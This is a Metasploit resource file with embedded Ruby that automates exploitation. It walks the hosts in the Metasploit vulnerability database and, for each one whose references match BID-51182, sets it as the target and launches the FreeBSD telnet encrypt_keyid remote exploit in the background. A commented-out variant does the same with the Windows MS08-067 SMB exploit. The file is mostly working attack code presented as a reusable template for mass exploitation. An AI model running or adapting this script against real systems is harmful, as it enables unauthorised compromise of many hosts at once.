# telnet-BID-51182-autoexploiter.rc
# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)

# This Metasploit RC-File could be used as a template to automate the exploitation process.
# It is just a short example and it should be modified to fit your needs. 

# bevore we start we need the vulnerability database with all the vulnerability references 
# for this process. Import some vulnerability scanner results or use the metasploit scanners for this ...

<ruby>
# the exploit that should be used automatically - check this:
exploit = "exploit/freebsd/telnet/telnet_encrypt_keyid"

# the string within the references which we are going to search - check this:
identifier = "BID-51182"

# alternative MS08-067 configuration
#exploit = "exploit/windows/smb/ms08_067_netapi"
#identifier = "MSFT-MS08-067"

# Test and see if we have a database connected
begin
	framework.db.hosts
rescue ::ActiveRecord::ConnectionNotEstablished
	print_error("Database connection isn't established")
	return
end

run_single("use #{exploit}")
framework.db.workspace.vulns.each do |vuln|
	next if (vuln.refs.to_s !~ /#{identifier}/)
	run_single("set RHOST #{vuln.host.address.to_s}")
	print_status("Running #{active_module.fullname} against host #{vuln.host.address.to_s}")
	run_single("exploit -q -z")
	sleep 1
end
run_single("back")
</ruby>

